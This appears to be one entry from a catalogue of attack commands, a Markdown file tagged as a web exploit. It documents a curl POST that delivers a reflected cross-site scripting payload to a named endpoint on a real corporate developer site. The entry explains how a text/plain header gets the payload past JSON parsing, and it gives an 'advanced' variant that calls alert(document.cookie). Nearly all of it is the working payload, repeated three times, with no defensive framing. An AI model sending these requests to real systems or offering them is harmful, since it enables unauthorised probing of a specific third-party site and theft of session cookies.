---
id: cmd-curl-post-xss
data: >-
  curl -X POST
  https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php -H
  "Content-Type: text/plain" --data-raw '{"helpful":"false&lt;svg
  onload=alert(1)&gt;"}'
tags:
  - web-exploit
  - post-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:12.988Z'
verified: false
validated: true
submitted: true
---
# curl-post-xss-payload

## Command

```bash
curl -X POST https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php -H "Content-Type: text/plain" --data-raw '{"helpful":"false&lt;svg onload=alert(1)&gt;"}'
```

## Description

This command sends a POST request with a raw text payload to exploit the reflected XSS in the FAQ form, bypassing JSON parsing by using text/plain content type.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php` | Target endpoint URL | Yes |
| `-H "Content-Type: text/plain"` | Sets header to send raw text | Yes |
| `--data-raw` | Sends unencoded data body | Yes |
| `'{"helpful":"false&lt;svg onload=alert(1)&gt;"}'` | Payload in JSON-like format | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php -H "Content-Type: text/plain" --data-raw '{"helpful":"false&lt;svg onload=alert(1)&gt;"}'
```

### Advanced Usage

```bash
curl -X POST https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php -H "Content-Type: text/plain" -v --data-raw '{"helpful":"false&lt;svg onload=alert(document.cookie)&gt;"}'
```

## Expected Output

HTTP response (200 OK) with body reflecting the unsanitized input, e.g., containing the SVG tag in HTML, which executes when rendered.

## Related

- [[Related Procedure|procedures/Submit-Payload-via-POST-Request]]
